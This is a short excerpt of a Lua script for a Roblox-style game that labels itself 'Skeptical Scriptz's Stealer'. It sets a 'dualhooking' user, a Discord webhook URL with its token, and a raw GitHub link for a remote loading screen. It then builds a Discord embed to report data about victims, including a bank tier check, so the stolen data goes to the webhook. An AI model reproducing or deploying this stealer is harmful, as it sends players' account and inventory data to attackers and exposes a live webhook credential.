...
local dhuser = "EZP0D"       -- dualhooking user
local dhwebhook = "https://discord.com/api/webhooks/1143880632959762503/8D-3Q6FpWGWTHb2yGL0iPi2rZjJcUYs0zoYZ_jJjjPQ3lu1UY1r7Pgq_DESaSlJjkgNk" -- Dualhooking Webhook
local loadingraw = "https://raw.githubusercontent.com/OfficialPSX/Testing/main/Loading_Screen.lua" -- Put Your LoadingScreen Raw Link Here
...
if banktiercheck == true then
    ...
    data1 = {
        ...
        ["embeds"] = { {
            ...
            ["fields"] = { {
                ["name"] = "**This data was generated using Skeptical Scriptz's Stealer** :moyai:",
